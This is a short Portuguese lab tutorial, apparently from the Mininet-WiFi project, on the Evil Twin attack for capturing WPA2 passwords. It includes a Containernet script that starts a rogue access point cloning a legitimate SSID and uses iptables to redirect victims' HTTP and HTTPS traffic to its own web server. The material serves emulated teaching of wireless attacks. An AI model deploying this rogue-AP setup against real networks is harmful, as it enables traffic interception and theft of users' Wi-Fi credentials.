************
Hackeando a senha de Wi-Fi WPA2 usando Evil Twin Attack | DNSMASQ e Hostapd
************


.. Note::
  **Neste documento você irá compreender como:**   
  
  - Acontece o ataque denominado de  Evil Twin Attack
  
  **Requisitos:** 
  
  - Containernet - https://github.com/ramonfontes/containernet
  - Hostapd

  **A VM disponível em https://github.com/intrig-unicamp/mininet-wifi possui todos os recursos necessários para reproduzir este documento.**

Antes de tudo você precisa identificar a topologia de rede que será gerada através do código abaixo:

```python=
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

from containernet.net import Containernet
from containernet.node import DockerSta
from mininet.log import setLogLevel, info
from containernet.cli import CLI
from containernet.term import makeTerm


def topology():
    "Create a network."
    net = Containernet()

    info("*** Creating nodes\n")
    sta1 = net.addStation('sta1', ip='0/0')
    sta2 = net.addStation('sta2')
    ap1 = net.addAccessPoint('ap1', ssid="simplewifi", mode="g", channel="1",
                             failMode="standalone", datapath='user')
    ap2 = net.addStation('ap2', cls=DockerSta, dimage="ramonfontes/rogue-ap", cpu_shares=20)

    info("*** Configuring wifi nodes\n")
    net.configureWifiNodes()

    info("*** Associating Stations\n")
    net.addLink(sta2, ap1)

    info("*** Starting network\n")
    net.build()
    ap1.start([])

    ap2.setMasterMode(intf='ap2-wlan0', ssid='simplewifi', channel='1', mode='g')
    #ap2.cmd('pkill -f \"ap2-wlan0.apconf\"')
    ap2.cmd('ifconfig ap2-wlan0 up 192.168.190.1 netmask 255.255.255.0')

    #ap2.cmd('iptables --flush')
    ap2.cmd('iptables --table nat --append POSTROUTING --out-interface ap2-eth1 -j MASQUERADE')
    ap2.cmd('iptables --append FORWARD --in-interface ap2-wlan0 -j ACCEPT')
    ap2.cmd('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.190.1:80')
    ap2.cmd('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.190.1:80')
    ap2.cmd('iptables -t nat -A POSTROUTING -j MASQUERADE')
    ap2.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')

    sta1.cmd('ifconfig sta1-wlan0 192.168.190.2/24')
    sta1.cmd('route add default gw 192.168.190.1')

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('debug')
    topology()
```

